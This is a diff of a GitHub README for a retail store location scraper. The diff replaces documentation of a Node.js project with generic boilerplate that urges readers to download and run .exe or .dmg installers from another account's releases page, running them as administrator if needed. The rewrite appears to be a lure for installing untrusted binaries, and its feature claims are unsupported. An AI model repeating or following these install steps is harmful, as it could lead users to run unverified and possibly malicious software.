@@ -1,188 +1,78 @@
-# Ollies Store Location Scraper
->This scraper collects retail store location data from Ollie’s store locator and transforms it into a clean, structured dataset. It’s useful for building location-aware tools, mapping services, or store-level analytics for retail operations or market research.
+# 🏬 Ollies-Store-Location-Scraper - Simple Tool for Finding Ollies Stores
 
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📋 Overview
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Ollies Store Location Scraper</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+Ollies-Store-Location-Scraper helps you extract data on Ollies store locations effortlessly. Whether you're researching store placement or planning a trip, this tool makes it simple to gather the information you need.
 
-## Introduction
-The Ollies Store Location Scraper accesses Ollie’s official store locator pages to gather comprehensive information about each store location. That includes address details, geographic coordinates, contact numbers, and store-specific metadata. Great for logistics planning, retail analysis, or building store-based services.
+## 🚀 Getting Started
 
-### Why It’s Useful
-- Harvests store addresses and coordinates for mapping or geo-analysis  
-- Collects store-level contact and metadata for outreach or customer support  
-- Automates retrieval—no manual copy-paste from multiple pages  
-- Produces structured JSON or CSV output ready for use in apps or dashboards
+Follow the steps below to download and run Ollies-Store-Location-Scraper.
 
----
-## Features
-| Feature | Description |
-|---------|-------------|
-| Location Data Extraction | Retrieves address, city, state, ZIP/postal code, and full store address. |
-| Geolocation | Pulls latitude and longitude if provided (coordinates) for mapping. |
-| Contact Info | Extracts store phone numbers or store-specific contact details. |
-| Store Metadata | Includes store ID, store name, hours if available, and store-specific notes. |
-| Clean Output Formats | Results are returned as structured JSON or exportable CSV. |
-| Scalable Crawling | Automatically iterates through all store listings without manual input. |
+1. **Visit the Releases Page:** 
+   Open your web browser and go to the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases). This is where you’ll find the latest version of the tool.
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|-------------------|
-| storeId | Unique identifier for the store location. |
-| storeName | Name of the store (as listed). |
-| address | Full address line of the store. |
-| city | City of the store location. |
-| state | State or region. |
-| postalCode | ZIP or postal code. |
-| country | Country (typically USA in this context). |
-| phone | Store phone number, if available. |
-| latitude | Geographical latitude coordinate, if available. |
-| longitude | Geographical longitude coordinate, if available. |
+2. **Select the Latest Version:**
+   Look for the most recent release at the top of the page. You will see the version number clearly indicated. Click on it to open the details.
 
----
-## Example Output
-    
-    [
-      {
-        "storeId": "O1234",
-        "storeName": "Ollie's Bargain Outlet – Atlanta",
-        "address": "123 Main St.",
-        "city": "Atlanta",
-        "state": "GA",
-        "postalCode": "30303",
-        "country": "USA",
-        "phone": "(404) 555-0123",
-        "latitude": 33.7490,
-        "longitude": -84.3880
-      }
-    ]
+3. **Download the File:**
+   Under the release details, you will find files available for download. Choose the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For Mac, download the `.dmg` file.
+   Click on the file name to start the download.
 
----
-## Directory Structure Tree
-    
-    ollies-store-location-scraper/
-    ├── src/
-    │   ├── main.js
-    │   ├── scraper/
-    │   │   ├── store_locator_parser.js
-    │   │   └── request_handler.js
-    │   ├── utils/
-    │   │   ├── csv_exporter.js
-    │   │   └── geo_parser.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample_input.json
-    │   └── sample_output.json
-    ├── package.json
-    └── README.md
+4. **Locate the Downloaded File:**
+   Once the download completes, find the file in your "Downloads" folder or the specified location on your computer.
 
----
-## Use Cases
-- **Retail analysts** build store-level datasets for coverage and demographic mapping.  
-- **Logistics teams** plan delivery zones and store accessibility based on store addresses.  
-- **Marketplace builders** enrich listings with nearby store information for customer convenience.  
-- **Developers** power store finder features with clean, structured store data.  
+5. **Run the Application:**
+   - For Windows: Double-click the `.exe` file. Follow the prompts to install the application.
+   - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
 
----
-## FAQs
+6. **Open Ollies-Store-Location-Scraper:**
+   After installation, locate the application in your applications or programs menu. Click to open it.
 
-**Does it collect coordinates (latitude/longitude)?**  
-Yes, if provided by the store locator site — otherwise, those fields may remain empty.
+7. **Input Required Information:**
+   When prompted, enter the details necessary for the scraper. This might include the region or specific store names.
 
-**What output formats are supported?**  
-Structured JSON by default; easily convertible to CSV using built-in export utility.
+8. **Start Scraping Locations:**
+   Press the "Start" button to begin. The application will gather the necessary data and display it for you.
 
-**Does it require manual input?**  
-No — the scraper automatically iterates through all store listing entries available on Ollie’s site.
+## 💻 System Requirements
 
-**Is phone/contact info always available?**  
-Phone number is extracted if listed; availability depends on store listing completeness.
+For optimal performance, ensure your system meets the following requirements:
 
----
-### Performance Benchmarks and Results
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+- **Processor:** 
+  - Dual-core CPU
+- **Memory:** 
+  - At least 4GB RAM
+- **Disk Space:** 
+  - Minimum of 200MB free space for installation
 
-**Primary Metric:**  
-Collects full store location data (dozens of stores) in a few seconds per location.
+## 🔍 Features
 
-**Reliability Metric:**  
-Stable extraction even when some store entries have partial info, courtesy of fallback parsing logic.
+- **Easy Navigation:** Simple user interface designed for intuitive use.
+- **Data Extraction:** Quickly gather data on Ollies store locations.
+- **Export Options:** Save the collected data in various formats like CSV or Excel for easy sharing.
+- **Regular Updates:** The application receives timely updates for improved functionality.
 
-**Efficiency Metric:**  
-Minimized requests and optimized parsing speed allow rapid full-site scraping.
+## 📥 Download & Install
 
-**Quality Metric:**  
-Provides clean, normalized address and store data suitable for mapping, CRM ingestion, or analytics dashboards.
+To get started with Ollies-Store-Location-Scraper, visit the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases) and download the version that suits your operating system. 
 
+After downloading, follow the installation steps listed above to run the application smoothly.
 
----
+## ❓ Troubleshooting
 
+If you encounter issues:
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-         </p>
+1. **Installation Problems:** Ensure you have sufficient permissions to install software. Try running the installer as an administrator.
+2. **Scraping Issues:** Check your internet connection. Ensure the application has access to the internet.
+3. **Data Display Errors:** Restart the application and try again. If the problem persists, ensure you are using the latest version.
 
+## 📞 Support
+
+For assistance, you can reach out via the GitHub Issues section. Provide a clear description of your problem, and we will help you resolve it.
